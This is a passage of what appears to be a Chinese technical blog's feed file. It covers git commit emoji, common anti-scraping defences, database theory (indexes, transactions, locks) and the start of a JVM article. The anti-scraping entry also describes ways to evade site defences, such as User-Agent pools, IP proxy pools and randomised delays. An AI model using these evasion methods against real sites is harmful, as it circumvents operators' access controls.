align="left">:package: <code>:package:</code></td></tr><tr><td align="left">合并分支</td><td align="left">:twisted_rightwards_arrows: <code>:twisted_rightwards_arrows:</code></td></tr><tr><td align="left">糟糕的代码&#x2F;需要改进</td><td align="left">:hankey: <code>:hankey:</code></td></tr><tr><td align="left">回滚改变</td><td align="left">:rewind: <code>:rewind:</code></td></tr><tr><td align="left">突发的变更</td><td align="left">:boom: <code>:boom:</code></td></tr><tr><td align="left">代码评审变更</td><td align="left">:ok_hand: <code>:ok_hand:</code></td></tr><tr><td align="left">无障碍</td><td align="left">:wheelchair: <code>:wheelchair:</code></td></tr><tr><td align="left">移动&#x2F;重命名仓库</td><td align="left">:truck: <code>:truck:</code></td></tr><tr><td align="left">国际化与本地化</td><td align="left">:globe_with_meridians:<code>:globe_with_meridians:</code></td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反爬虫姿势与绕过</title>
    <link href="/blog/2023/03/30/%E5%8F%8D%E7%88%AC%E8%99%AB%E5%A7%BF%E5%8A%BF%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <url>/blog/2023/03/30/%E5%8F%8D%E7%88%AC%E8%99%AB%E5%A7%BF%E5%8A%BF%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p><strong>爬虫是指使用任何技术手段，批量获取网站信息的一种方式。</strong><br><strong>反爬虫是指使用任何技术手段，阻止别人批量获取自己网站信息的一种方式。</strong></p><p><img src="/./images/fj44.jpg"></p><span id="more"></span><h2 id="常见的反爬虫机制"><a href="#常见的反爬虫机制" class="headerlink" title="常见的反爬虫机制"></a>常见的反爬虫机制</h2><h3 id="通过User-Agent识别爬虫"><a href="#通过User-Agent识别爬虫" class="headerlink" title="通过User-Agent识别爬虫"></a>通过User-Agent识别爬虫</h3><p>网站可以通过User-Agent来判断用户是使用什么浏览器访问，不同浏览器的User-Agent是不一样的，但是如果爬虫使用Requests库访问，没有配置UA，即可判断出该请求不是浏览器发出，通过识别特征UA，直接封掉爬虫请求。</p><h3 id="访问频率限制"><a href="#访问频率限制" class="headerlink" title="访问频率限制"></a>访问频率限制</h3><h4 id="设置IP访问频率"><a href="#设置IP访问频率" class="headerlink" title="设置IP访问频率"></a>设置IP访问频率</h4><p>如果超过一定频率，弹出验证码验证，如果输入正确的验证码，则放行，如果没有输入，则禁止访问一段时间，如果超过禁爬时间，再次触发验证码，则拉入黑名单。可以根据具体的业务，为不同场景设置不同阈值，比如登录用户和非登录用户，请求是否含有referer。</p><h4 id="统计并发最高的IP"><a href="#统计并发最高的IP" class="headerlink" title="统计并发最高的IP"></a>统计并发最高的IP</h4><p>有些爬虫的并发是很高的，统计并发最高的IP，加入黑名单</p><h4 id="请求时间窗口过滤统计"><a href="#请求时间窗口过滤统计" class="headerlink" title="请求时间窗口过滤统计"></a>请求时间窗口过滤统计</h4><p>爬虫爬取网页的频率都是比较固定的，不像人去访问网页，中间的间隔时间比较无规则，所以我们可以给每个IP地址建立一个时间窗口，记录IP地址最近访问时间，每记录一次就滑动一次窗口，比较最近访问时间和当前时间。如果间隔时间很长判断不是爬虫，清除时间窗口；如果间隔不长，就回溯计算指定时间段的访问频率，如果访问频率超过阀值，就转向验证码页面让用户填写验证码</p><h4 id="限制api-token的访问量"><a href="#限制api-token的访问量" class="headerlink" title="限制api token的访问量"></a>限制api token的访问量</h4><h4 id="识别合法搜索引擎爬虫"><a href="#识别合法搜索引擎爬虫" class="headerlink" title="识别合法搜索引擎爬虫"></a>识别合法搜索引擎爬虫</h4><h4 id="封Cookie"><a href="#封Cookie" class="headerlink" title="封Cookie"></a>封Cookie</h4><h3 id="JavaScript渲染"><a href="#JavaScript渲染" class="headerlink" title="JavaScript渲染"></a>JavaScript渲染</h3><ol><li>由 JavaScript 改变 HTML DOM 导致页面内容发生变化的现象称为动态渲染。网页开发者将重要信息放在网页中但不写入html标签中，而浏览器会自动渲染<script>标签中的js代码将信息展现在浏览器当中，而爬虫是不具备执行js代码的能力，所以无法将js事件产生的信息读取出来。</li><li>访问网页的时候服务器将网页框架返回给客户端，在与客户端交互的过程中通过<strong>异步ajax技术</strong>传输数据包到客户端，呈现在网页上，爬虫直接抓取的话信息为空。</li></ol><p>该方法无法防止无头浏览器形式的爬虫</p><h3 id="图片伪装、CSS乱序、SVG映射"><a href="#图片伪装、CSS乱序、SVG映射" class="headerlink" title="图片伪装、CSS乱序、SVG映射"></a>图片伪装、CSS乱序、SVG映射</h3><p><strong>图片伪装</strong>指的是将带有文字的图片与正常文字混合在一起，以达到“鱼目混珠”的效果。这种混淆方式并不会影响用户阅读，但是可以让爬虫程序无法获得“所见”的文字内容。</p><p><strong>CSS乱序</strong>这种方法是利用 <strong>CSS 样式</strong>将乱序的文字排版为人类正常阅读顺序的行为。如果不细心观察，爬虫工程师很容易被爬取结果糊弄。这种混淆方法和图片伪装一样，并不会影响用户阅读。</p><p><strong>SVG映射</strong>是通过用矢量图形代替具体文字，<strong>不会影响用户正常阅读</strong>，但爬虫程序却无法像读取文字那样获得 SVG 图形中的内容。</p><h3 id="蜜罐资源"><a href="#蜜罐资源" class="headerlink" title="蜜罐资源"></a>蜜罐资源</h3><p>爬虫解析离不开正则匹配，适当在页面添加一些正常浏览器浏览访问不到的资源，一旦有IP访问，过滤下头部是不是搜素引擎的蜘蛛，不是就可以直接封了。比如说隐式链接。</p><h2 id="绕过反爬虫机制"><a href="#绕过反爬虫机制" class="headerlink" title="绕过反爬虫机制"></a>绕过反爬虫机制</h2><h3 id="爬取随机延迟"><a href="#爬取随机延迟" class="headerlink" title="爬取随机延迟"></a>爬取随机延迟</h3><p>设置爬取延迟为随机ns，n越大越越不容易被反爬虫机制发现，但是会影响爬取效率</p><h3 id="禁用Cookie"><a href="#禁用Cookie" class="headerlink" title="禁用Cookie"></a>禁用Cookie</h3><p>某些网站可以通过Cookie识别用户身份，禁用Cookie可能可以防止服务器追踪爬虫</p><h3 id="使用User-Agent池"><a href="#使用User-Agent池" class="headerlink" title="使用User-Agent池"></a>使用User-Agent池</h3><p>每次发送的时候随机从池中选择不一样的浏览器头信息，防止暴露爬虫身份</p><h3 id="使用IP代理池"><a href="#使用IP代理池" class="headerlink" title="使用IP代理池"></a>使用IP代理池</h3><p>需要大量IP资源</p><h3 id="分布式爬取"><a href="#分布式爬取" class="headerlink" title="分布式爬取"></a>分布式爬取</h3><p>针对大型爬虫系统实现一个分布式爬虫：</p><p>1、基本的http抓取工具，如scrapy； 2、避免重复抓取网页，如Bloom Filter； 3、维护一个所有集群机器能够有效分享的分布式队列； 4、将分布式队列和Scrapy的结合； 5、后续处理，网页析取，存储(如Mongodb)。</p><h3 id="针对蜜罐采取定向爬虫"><a href="#针对蜜罐采取定向爬虫" class="headerlink" title="针对蜜罐采取定向爬虫"></a>针对蜜罐采取定向爬虫</h3><p>定向爬虫获取信息，配上手工或者自动的模版进行信息匹配，将信息进行格式化分析存储。<br>优势：<br>基于模版的信息提取技术，能提供更加精准的信息。<br>劣势：<br>目标网站难以大面积覆盖，因为基于模版匹配的信息提取技术，需要人工的参与配置模版，欲要大面积覆盖各个目标网站，需要大量的人力成本，同样维护模板也需要很大的人力成本。</p>]]></content>
    
    
    
    <tags>
      
      <tag>反爬虫</tag>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础知识复习--数据库</title>
    <link href="/blog/2023/02/28/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/blog/2023/02/28/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p><strong>数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。</strong></p><span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="数据库三大范式"><a href="#数据库三大范式" class="headerlink" title="数据库三大范式"></a>数据库三大范式</h3><p>1NF：第一范式是最基本的范式。如果数据库表中的所有字段值都是不可分解的原子值，并且有一个主键</p><p>2NF：第二范式在第一范式的基础之上更进一层。第二范式需要确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关</p><p>3NF：第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关，不能产生传递依赖。</p><h3 id="MySql如何执行一条SQL语句"><a href="#MySql如何执行一条SQL语句" class="headerlink" title="MySql如何执行一条SQL语句"></a>MySql如何执行一条SQL语句</h3><ol><li>客户端请求-&gt;</li><li>连接器（验证用户身份，给予权限） -&gt;</li><li>查询缓存（存在缓存则直接返回，不存在则执行后续操作）-&gt;</li><li>分析器（对SQL进行词法分析和语法分析操作） -&gt;</li><li>优化器（主要对执行的sql优化选择最优的执行方案方法） -&gt;</li><li>执行器（执行时会先看用户是否有执行权限，有才去使用这个引擎提供的接口）-&gt;</li><li>去引擎层获取数据返回（如果开启查询缓存则会缓存查询结果）</li></ol><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="索引的分类"><a href="#索引的分类" class="headerlink" title="索引的分类"></a>索引的分类</h3><p>单一索引：给单独的一个字段添加索引</p><p>复合索引：给多个字段联合起来添加索引</p><p>主键索引：主键上自动添加的索引</p><p>唯一索引：有unique约束的字段上会自动添加索引</p><h3 id="索引的优点"><a href="#索引的优点" class="headerlink" title="索引的优点"></a>索引的优点</h3><p>索引类似于一本书的目录，可以通过索引快速找到对应的资源；</p><p>在数据库中，查询一张表的时候有两种检索方式：全表扫描和索引检索（效率高）</p><h3 id="索引的设计原则"><a href="#索引的设计原则" class="headerlink" title="索引的设计原则"></a>索引的设计原则</h3><p>数据量庞大时使用</p><p>索引字段很少进行DML操作（因为字段进行修改操作时，索引也需要维护）</p><p>经常根据某个字段进行查询</p><p>尽量使用数据量较少的字段作为索引</p><p>限制索引的数量，删除不再使用或者很少使用的索引</p><h3 id="索引的数据结构"><a href="#索引的数据结构" class="headerlink" title="索引的数据结构"></a>索引的数据结构</h3><p>索引的数据结构和具体的存储引擎实现有关，MySql中常用的是B+树和Hash索引。</p><p>Hash索引底层就是哈希表，查询时调用哈希函数获取相应的键值，然后查询表获得实际数据</p><p>B+树索引底层实现原理是多路平衡查找树，对于每次查询都从根节点出发，查询到叶子节点才能查询到键值，最后判断是否要回表查询</p><h4 id="Hash和B-树索引的区别"><a href="#Hash和B-树索引的区别" class="headerlink" title="Hash和B+树索引的区别"></a>Hash和B+树索引的区别</h4><p>Hash进行等值查询更快，但是无法进行范围查询（hash原理决定的无序），而B+树本质上是一棵查找树，自然支持范围查询和排序</p><p>Hash任何时候都要回表查询数据，在符合某些条件（聚簇索引、覆盖索引等）时候可以只通过索引完成查询</p><p>Hash虽然在等值查询时效率比较高，但是性能不稳定，当某个键值存在大量重复时产生Hash碰撞效率反倒会降低，B+树查询效率比较稳定，因为每次查询都是从根节点到叶子节点</p><p><strong>采用B+树作为索引的原因：</strong></p><p>一、<strong>从内存角度上说</strong>，数据库中的索引一般是在磁盘上，数据量大的情况可能无法一次性装入内存，B+树的设计可以允许数据分批加载。</p><p>二、<strong>从业务场景上说</strong>，如果只选择一个数据那确实是hash更快，但是数据库中经常会选中多条，这时候由于B+树索引有序，并且又有链表相连，它的查询效率比hash就快很多了。</p><h4 id="为什么使用B-树而不使用二叉树或B树做索引"><a href="#为什么使用B-树而不使用二叉树或B树做索引" class="headerlink" title="为什么使用B+树而不使用二叉树或B树做索引"></a>为什么使用B+树而不使用二叉树或B树做索引</h4><p><strong>二叉树</strong></p><p>如果索引数据量很大时，数的高度会很大，查询会变慢，查找效率是O（logn）</p><p>二叉树每个节点只存储一个记录，一次查询在树上找的时候花费磁盘IO次数太多</p><p><strong>B树</strong></p><p>不再是二叉搜索，而是N叉搜索，树的高度会降低，查询速度块</p><p>叶子节点和非叶子节点都可以存储数据，并且可以存储多个数据，每个节点存储子节点数-1的关键字，子节点数&gt;&#x3D;阶数&#x2F;2</p><p>通过中序遍历可以访问树上所有的节点</p><p><strong>B+树</strong></p><p><img src="/images/b+tree.png"></p><p>B树的叶子节点和非叶子节点都存储数据，因此查询数据的时候时间复杂度最好为O(1)，最差为O(logn)，而B+树只有叶子节点存储数据，非叶子节点存储关键字，时间复杂度固定在O(logn)。</p><p>B+树叶子节点之间用链表连接，因此只需要扫描叶子节点的链表就可以完成一次遍历操作，B树只能通过中序遍历。</p><h4 id="为什么B-树比B树更适合用于数据索引？"><a href="#为什么B-树比B树更适合用于数据索引？" class="headerlink" title="为什么B+树比B树更适合用于数据索引？"></a>为什么B+树比B树更适合用于数据索引？</h4><ol><li>B+树会减少磁盘IO次数：由于索引文件很大，因此索引文件会存储在磁盘上，B+树的非叶子节点只存关键字不存数据，单个页会存储更多的关键字，一次性读入内存的关键字越多，磁盘IO会减少</li><li>B+树查询效率更稳定</li><li>B+树更适合范围查找：B+树叶子节点之间用链表有序链接，所以扫描全部数据可以扫描叶子节点，有助于数据库范围查询，而B树非叶子节点也会存储数据，所以只能通过中序遍历扫描；对于范围查询和有序遍历来言B+树效率更高</li></ol><h3 id="什么是回表？"><a href="#什么是回表？" class="headerlink" title="什么是回表？"></a>什么是回表？</h3><p>Mysql回表指的是在InnoDB存储引擎下，二级索引查询到的索引列，如果需要查找所有列的数据，则需要到主键索引里面去取出数据。这个过程就称为回表。因为行的数据都是存在主键B+tree的叶子节点里面，二级索引的B+树叶子节点都是存放的(索引列,主键)。简单来说，回表就是 MySQL 要先查询到主键索引，然后再用主键索引定位到数据</p><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><h3 id="MySQL存储引擎（MyISAM和InnoDB）"><a href="#MySQL存储引擎（MyISAM和InnoDB）" class="headerlink" title="MySQL存储引擎（MyISAM和InnoDB）"></a>MySQL存储引擎（MyISAM和InnoDB）</h3><p>区别：</p><ol><li>InnoDB支持事务，MyISAM不支持</li><li>InnoDB支持外键，MyISAM不支持</li><li>二者都支持B+树索引，但是InnoDB是聚集索引（聚集索引就是按照每张表的主键构造一颗B+树，同时叶子节点中存放的就是整张表的行记录数据，也将聚集索引的叶子节点称为数据页），MyISAM非聚集索引（辅助索引，数据不存储在索引上，索引指向数据存放位置）</li><li>InnoDB不记录表的行数，MyISAM会用一个变量记录整个表的行数</li><li>InnoDB支持表、行（默认）级锁，MyISAM只支持表级</li><li>InnoDB必须有唯一索引，如果没有会寻找或者自动生成一个隐藏列来充当主键，MuISAM可以没有主键</li></ol><p>默认使用InnoDB，MyISAM适合插入为主的情况，比如博客系统、新闻门户等经常更新的场景</p><h4 id="表锁"><a href="#表锁" class="headerlink" title="表锁"></a>表锁</h4><p>不会出现死锁，发生锁冲突几率高，并发低。</p><p>MyISAM在执行查询语句（select）前，会自动给涉及的所有表加读锁，在执行增删改操作前，会自动给涉及的表加写锁。</p><p>MySQL的表级锁有两种模式：表共享读锁和表独占写锁。</p><p>读锁会阻塞写，写锁会阻塞读和写</p><ul><li>对MyISAM表的读操作，不会阻塞其它进程对同一表的读请求，但会阻塞对同一表的写请求。只有当读锁释放后，才会执行其它进程的写操作。</li><li>对MyISAM表的写操作，会阻塞其它进程对同一表的读和写操作，只有当写锁释放后，才会执行其它进程的读写操作。</li></ul><p>MyISAM不适合做写为主表的引擎，因为写锁后，其它线程不能做任何操作，大量的更新会使查询很难得到锁，从而造成永远阻塞。</p><h4 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h4><p>会出现死锁，发生锁冲突几率低，并发高。</p><p>在MySQL的InnoDB引擎支持行锁，与Oracle不同，MySQL的行锁是通过索引加载的，也就是说，行锁是加在索引响应的行上的，要是对应的SQL语句没有走索引，则会全表扫描，行锁则无法实现，取而代之的是表锁，此时其它事务无法对当前表进行更新或插入操作。</p><p><strong>行锁的实现需要注意：</strong></p><ul><li>行锁必须有索引才能实现，否则会自动锁全表，那么就不是行锁了。</li><li>如果是共享锁，两个事务可以锁同一个索引，排它锁则不能。</li><li>insert，delete，update在事务中都会自动默认加上排它锁。</li></ul><p><strong>行锁的适用场景：</strong></p><p>A用户消费，service层先查询该用户的账户余额，若余额足够，则进行后续的扣款操作；这种情况查询的时候应该对该记录进行加锁。</p><p>否则，B用户在A用户查询后消费前先一步将A用户账号上的钱转走，而此时A用户已经进行了用户余额是否足够的判断，则可能会出现余额已经不足但却扣款成功的情况。</p><p>为了避免此情况，需要在A用户操作该记录的时候进行for update加锁</p><h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><p>InnoDB的页、区和段：</p><ul><li>页：将物理磁盘划分为页，每页的大小默认为16kb，页是最小的存储单位</li><li>区：如果只有页一个层次，页的个数是非常多的，存储空间的分配和回收都很麻烦，因为要维护这么多页的状态非常麻烦，因此就引入了区（Extent）的概念，一个区默认是64个连续的页组成</li><li>段：B+树的叶子节点存放的是具体的数据，非叶子节点是索引页，因此每个索引都会创建两个Segment去存放对应的数据</li></ul><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="什么是数据库的事务？"><a href="#什么是数据库的事务？" class="headerlink" title="什么是数据库的事务？"></a>什么是数据库的事务？</h3><p>一个事务是一个完整的业务逻辑单元，不可再分：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">#比如A向B转账：<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">-</span> <span class="hljs-number">100</span> <span class="hljs-keyword">where</span> cusno <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;00001&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">+</span> <span class="hljs-number">100</span> <span class="hljs-keyword">where</span> cusno <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;00002&#x27;</span>;<br></code></pre></td></tr></table></figure><p>DML(Data Manipulation Language)语句:数据操纵语句</p><p>以上DML语句必须同时成功或者失败，不允许一条成功另一条失败；为了保证同时成功或失败，就需要使用数据库的事务机制。</p><h3 id="事务的四大特征"><a href="#事务的四大特征" class="headerlink" title="事务的四大特征"></a>事务的四大特征</h3><p>事务具有四个特征：原子性（ Atomicity ）、一致性（ Consistency ）、隔离性（ Isolation ）和持续性（ Durability ）。这四个特性简称为 ACID 特性。</p><p>1 、原子性。事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用。</p><p>2 、一致性。执行事务前后，数据保持一致，多个事务对同一个数据读取的结果是相同的。</p><p>3 、隔离性。一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。</p><p>4 、持续性。也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的。接下来的其它操作或故障不应该对其执行结果有任何影响。</p><h3 id="如何保障数据库事务的ACID特性？"><a href="#如何保障数据库事务的ACID特性？" class="headerlink" title="如何保障数据库事务的ACID特性？"></a>如何保障数据库事务的ACID特性？</h3><h4 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h4><p>主要利用InnoDB的回滚日志，当事务回滚时能够撤销所有已经成功执行的SQL语句，undo log记录了回滚需要的信息，当事务执行失败就利用日志中的信息去将数据rollback修改回之前的样子</p><h4 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h4><ul><li><strong>从数据库层面</strong>，数据库通过原子性、隔离性、持久性来保证一致性。也就是说ACID四大特性之中，C(一致性)是目的，A(原子性)、I(隔离性)、D(持久性)是手段，是为了保证一致性，数据库提供的手段。<strong>数据库必须要实现AID三大特性，才有可能实现一致性</strong>。例如，原子性无法保证，显然一致性也无法保证。</li><li><strong>从应用层面</strong>，通过代码判断数据库数据是否有效，然后决定回滚还是提交数据</li></ul><h4 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h4><p><strong>脏读：</strong>一个事务读取到另一个事务尚未提交的数据。 事务 A 读取事务 B 更新的数据，然后 B 回滚操作，那么 A 读取到的数据是脏数据。</p><p><strong>不可重复读：</strong>一个事务中两次读取的数据内容不一致。事务A多次读同一数据，事务B在事务A多次读取过程中对数据做了更新提交，导致A多次读取同一数据时结果不一致。</p><p><strong>幻读：</strong>一个事务中两次读取的数据量不一致。系统管理员 A 将数据库中所有学生的成绩从具体分数改为 ABCDE 等级，但是系统管理员 B 就在这个时候插入了一条具体分数的记录，当系统管理员 A 改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。</p><p>数据库的隔离级别：</p><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>READ-UNCOMMITTED 未提交读</td><td>√</td><td>√</td><td>√</td></tr><tr><td>READ-COMMITTED 提交读</td><td>×</td><td>√</td><td>√</td></tr><tr><td>REPEATABLE-READ 重复读</td><td>×</td><td>×</td><td>√</td></tr><tr><td>SERIALIZABLE 可串行化读</td><td>×</td><td>×</td><td>×</td></tr></tbody></table><p>未提交读：对方事务未提交但是我们可以读到</p><p>读已提交：对方事务提交之后我方可以读</p><p>可重复读：解决一个事务中两次读取的数据内容不一致的问题</p><p>可串行化：解决所有问题，但是效率低</p><p><strong>oracle</strong> 数据库默认的隔离级别是<strong>读已提交</strong>；<strong>mysql</strong> 数据库默认的隔离级别是<strong>可重复读</strong>。</p><p>InnoDB 存储引擎在 REPEATABLE-READ（可重读）事务隔离级别 下使用的是<strong>Next-Key Lock 锁</strong>算法，因此可以避免幻读的产生，达到串行化读</p><h4 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h4><p>利用InnoDB的redo log，当数据修改时，不仅在内存中操作，还会在redo log中记录这次操作，当事务提交时，会将redo log进行刷盘，当数据库宕机时会将redo log中的内容恢复到数据库，再根据undo log和bin log内容决定提交数据还是回滚数据</p><ul><li><strong>redo log</strong>体积小，毕竟只记录了哪一页修改了啥，因此体积小，刷盘快。</li><li><strong>redo log</strong>是一直往末尾进行追加，属于顺序IO。效率显然比随机IO来的快。</li></ul><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="数据库锁的分类及作用"><a href="#数据库锁的分类及作用" class="headerlink" title="数据库锁的分类及作用"></a>数据库锁的分类及作用</h3><p>锁是用来解决并发事务的数据不一致问题的</p><h4 id="锁的粒度"><a href="#锁的粒度" class="headerlink" title="锁的粒度"></a>锁的粒度</h4><p><strong>行级锁：</strong>是最细粒度的一种锁，表示只针对当前操作的行进行加锁，可以大大减少数据库操作的冲突，开销最大，加锁慢，会出现死锁，但是锁冲突概率低，并发度高</p><p><strong>表级锁：</strong>粒度最大的一种锁，表示对当前操作的整张表进行加锁，实现简单，资源消耗少，被大部分MySQL引擎支持</p><p><strong>页级锁：</strong>粒度介于以上之间的一种锁，折中，一次锁定相邻的一组记录</p><h4 id="使用性质"><a href="#使用性质" class="headerlink" title="使用性质"></a>使用性质</h4><p><strong>共享锁：</strong>又称为S锁、读锁，用于对所有的只读数据操作；S锁非独占，允许多个并发事务对同一资源加锁，但是加S锁的同时不允许加X锁，即资源不能被修改，S锁读取结束立即释放</p><p><strong>排他锁：</strong>X锁、写锁，表示对数据进行写操作，X锁只允许一个事务对同一资源加锁，事务结束才释放，其他事务必须等待X锁释放才能对该页进行访问</p><p><strong>更新锁：</strong>U锁，用来预定要对资源施加 X 锁，允许其他事务读，但不允许再施加 U 锁或 X 锁。当被读取的页将要被更新时，则升级为 X 锁，U 锁一直到事务结束时才能被释放。故 U 锁用来避免使用共享锁造成的死锁现象。</p><h4 id="主观"><a href="#主观" class="headerlink" title="主观"></a>主观</h4><p><strong>乐观锁：</strong>从主观上认定资源是不会被修改的，所以不加锁读取数据，仅当更新时用版本号机制等确认资源是否被修改。<br>乐观锁适用于多读的应用类型，可以系统提高吞吐量。</p><p><strong>悲观锁：</strong>具有强烈的独占和排它特性，每次读取数据时都会认为会被其它事务修改，所以每次操作都需要加上锁</p><h3 id="隔离级别和锁的关系"><a href="#隔离级别和锁的关系" class="headerlink" title="隔离级别和锁的关系"></a>隔离级别和锁的关系</h3><p>读未提交级别下读数据不需要加共享锁，这样就不会跟修改数据上的排他锁冲突</p><p>读已提交级别下读数据需要加共享锁，语句执行完之后释放</p><p>可重复读级别下读需要加共享锁，但是事务提交之前不释放共享锁，必须等待事务执行完毕释放共享锁</p><p>串行化限制最强，锁定整个范围的键，并一直持有锁，直到事务完成</p><h3 id="快照读和当前读"><a href="#快照读和当前读" class="headerlink" title="快照读和当前读"></a>快照读和当前读</h3><p>快照读读取的就是快照数据，不加锁的简单select都是快照读</p><p>当前读就是读取最新数据而不是历史数据</p><h3 id="MVCC及实现"><a href="#MVCC及实现" class="headerlink" title="MVCC及实现"></a>MVCC及实现</h3><p>MVCC多版本并发控制，可以做到读写相互不阻塞，用于解决不可重复读和幻读是提高并发效率</p><p>原理是通过多个版本管理来实现数据库的并发控制，保存数据的历史版本，通过比较版本号决定数据是否显示，读取数据时候不用加锁就可以保证事务的隔离效果</p><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><h3 id="语句书写和执行顺序"><a href="#语句书写和执行顺序" class="headerlink" title="语句书写和执行顺序"></a>语句书写和执行顺序</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">(7)     <span class="hljs-keyword">SELECT</span> <br>(<span class="hljs-number">8</span>)     <span class="hljs-keyword">DISTINCT</span> &lt;select_list&gt; <br>(<span class="hljs-number">1</span>)     <span class="hljs-keyword">FROM</span> &lt;left_table&gt; <br>(<span class="hljs-number">3</span>)     &lt;join_type&gt; <span class="hljs-keyword">JOIN</span> &lt;right_table&gt; <br>(<span class="hljs-number">2</span>)     <span class="hljs-keyword">ON</span> &lt;join_condition&gt; <br>(<span class="hljs-number">4</span>)     <span class="hljs-keyword">WHERE</span> &lt;where_condition&gt; <br>(<span class="hljs-number">5</span>)     <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> &lt;group_by_list&gt; <br>(<span class="hljs-number">6</span>)     <span class="hljs-keyword">HAVING</span> &lt;having_condition&gt; <br>(<span class="hljs-number">9</span>)     <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> &lt;order_by_condition&gt; <br>(<span class="hljs-number">10</span>)    <span class="hljs-keyword">LIMIT</span> &lt;limit_number&gt;<br></code></pre></td></tr></table></figure><p>序号代表执行顺序</p>]]></content>
    
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java学习之路--JVM篇</title>
    <link href="/blog/2023/02/26/Java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-JVM%E7%AF%87/"/>
    <url>/blog/2023/02/26/Java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-JVM%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<p><strong>JVM (Java虚拟机)是可运行 Java 代码的假想计算机 ，包括一套字节码指令集、一组寄存器、一个栈、</strong><br><strong>一个垃圾回收，堆 和 一个存储方法域。 JVM 是运行在操作系统之上的，它与硬件没有直接</strong><br><strong>的交互。深入理解JVM的工作原理有助于更好地学习Java这门语言。</strong></p><span id="more"></span><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>Hotspot JVM 中的 Java 线程与原生操作系统线程有直接的映射关系。 当线程本地存储、缓冲区分配、同步对象、栈、程序计数器等准备好以后，就会创建一个操作系统原生线程。Java 线程结束，原生线程随之被回收。操作系统负责调度所有线程，并把它们分配到任何可用的 CPU 上。当原生线程初始化完毕，就会调用 Java 线程的 run() 方法。当线程结束时，会释放原生线程和 Java 线程的所有资源。</p><h3 id="HotSpot-JVM后台运行的系统线程"><a href="#HotSpot-JVM后台运行的系统线程" class="headerlink" title="HotSpot JVM后台运行的系统线程"></a>HotSpot JVM后台运行的系统线程</h3><table><thead><tr><th align="center">线程</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">虚拟机线程</td><td align="center">该线程等待JVM到达安全点操作出现。这些操作必须要在独立的线程里执行，因为当堆修改无法进行时，线程都需要JVM位于安全点。这些操作的类型有：stop-the-word垃圾回收、线程dump、线程暂停、线程偏向锁</td></tr><tr><td align="center">周期性任务线程</td><td align="center">该线程负责定时器事件（中断），用来调度周期性操作的执行</td></tr><tr><td align="center">GC线程</td><td align="center">支持JVM中不同的垃圾回收活动</td></tr><tr><td align="center">编译器线程</td><td align="center">这些线程在运行时将字节码动态编译成本地平台相关的机器码</td></tr><tr><td align="center">信号分发线程</td><td align="center">接收发送到JVM的信号并调用适当的JVM方法处理</td></tr></tbody></table><h2 id="JVM内存区域"><a href="#JVM内存区域" class="headerlink" title="JVM内存区域"></a>JVM内存区域</h2><p><img src="/images/jvmmem.png"></p><p>JVM 内存区域主要分为线程私有区域【程序计数器、虚拟机栈、本地方法区】、线程共享区<br>域【JAVA 堆、方法区】、直接内存。</p><p>线程私有数据区域生命周期与线程相同, 依赖用户线程的启动&#x2F;结束 而 创建&#x2F;销毁(在 Hotspot<br>JVM 